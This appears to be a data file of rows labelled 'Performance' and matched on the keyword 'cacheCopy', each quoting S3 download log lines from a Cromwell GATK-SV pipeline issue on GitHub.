Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz; 1608597335401,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-82/cacheCopy/SR00c.HG03472.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-82/cacheCopy/SR00c.HG03472.txt.gz.tbi; 1608597338143,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz; 1608597340856,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-67/cacheCopy/SR00c.HG02642.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:108530,cache,cacheCopy,108530,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-118/cacheCopy/SR00c.NA18941.txt.gz; 1608597031084,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-72/cacheCopy/SR00c.HG03007.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-72/cacheCopy/SR00c.HG03007.txt.gz.tbi; 1608597033701,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-114/cacheCopy/SR00c.NA18553.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-114/cacheCopy/SR00c.NA18553.txt.gz; 1608597036753,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-85/cacheCopy/SR00c.HG03604.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:25630,cache,cacheCopy,25630,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz; 1608597352822,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz.tbi; 1608597355348,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-102/cacheCopy/SR00c.HG04183.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-102/cacheCopy/SR00c.HG04183.txt.gz; 1608597359185,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:112886,cache,cacheCopy,112886,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-131/cacheCopy/SR00c.NA19443.txt.gz; 1608597378569,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-40/cacheCopy/SR00c.HG01874.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-40/cacheCopy/SR00c.HG01874.txt.gz.tbi; 1608597381292,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz; 1608597382846,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:119746,cache,cacheCopy,119746,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz; 1608597550096,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz.tbi; 1608597552897,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz; 1608597554503,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:171162,cache,cacheCopy,171162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz; 1608597308537,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-35/cacheCopy/SR00c.HG01747.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-35/cacheCopy/SR00c.HG01747.txt.gz.tbi; 1608597310848,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-76/cacheCopy/SR00c.HG03100.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-76/cacheCopy/SR00c.HG03100.txt.gz; 1608597312994,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:101052,cache,cacheCopy,101052,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz; 1608597295559,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz.tbi; 1608597297393,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-99/cacheCopy/SR00c.HG04118.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-99/cacheCopy/SR00c.HG04118.txt.gz.tbi; 1608597299791,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:97302,cache,cacheCopy,97302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-153/cacheCopy/SR00c.NA20895.txt.gz; 1608597014237,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz.tbi; 1608597016404,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz; 1608597018214,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:21276,cache,cacheCopy,21276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz; 1608597361344,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-33/cacheCopy/SR00c.HG01607.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-33/cacheCopy/SR00c.HG01607.txt.gz.tbi; 1608597362768,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-102/cacheCopy/SR00c.HG04183.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-102/cacheCopy/SR00c.HG04183.txt.gz.tbi; 1608597364585,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-63/cacheCopy/SR00c.HG02586.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:114755,cache,cacheCopy,114755,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz; 1608597393258,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-27/cacheCopy/SR00c.HG01384.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-27/cacheCopy/SR00c.HG01384.txt.gz.tbi; 1608597394986,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz.tbi; 1608597397902,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:124123,cache,cacheCopy,124123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-82/cacheCopy/SR00c.HG03472.txt.gz; 1608597156183,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-116/cacheCopy/SR00c.NA18638.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-116/cacheCopy/SR00c.NA18638.txt.gz.tbi; 1608597157882,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz.tbi; 1608597159853,download: 